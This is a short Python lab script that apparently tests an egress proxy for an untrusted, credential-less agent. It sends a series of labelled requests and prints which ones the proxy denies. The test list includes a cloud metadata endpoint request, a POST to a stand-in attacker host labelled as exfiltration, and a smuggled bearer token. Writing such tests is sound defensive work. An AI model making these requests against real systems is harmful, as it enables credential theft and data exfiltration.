"""Lab 11: an untrusted agent with NO credentials, all traffic through the egress proxy.
It even tries to smuggle its own Authorization header - the proxy overwrites it.

  python labs/11_sandbox_proxy/sandboxed_agent.py
"""
import httpx

PROXY = "http://localhost:8200/"
TRIES = [
    ("allowed + credentialed", "GET", "https://api.github.com/repos/acme/checkout/issues"),
    ("who am I on GitHub?", "GET", "https://api.github.com/user"),
    ("allowed, no credential", "GET", "https://pypi.org/simple/httpx/"),
    ("repo outside the prefix", "GET", "https://api.github.com/repos/other-org/secret/issues"),
    ("cleartext HTTP", "GET", "http://api.github.com/user"),
    ("cloud metadata endpoint", "GET", "https://169.254.169.254/latest/meta-data/"),
    ("exfiltration attempt", "POST", "https://evil.example/upload"),
]

for label, method, url in TRIES:
    r = httpx.request(method, PROXY + url, headers={"Authorization": "Bearer stolen-or-made-up"}, timeout=30)
    reason = r.headers.get("x-keycard-deny-reason")
    body = r.text[:90].replace("\n", " ")
    print(f"{label:26} {r.status_code}  {'DENIED: ' + reason if reason else body}")
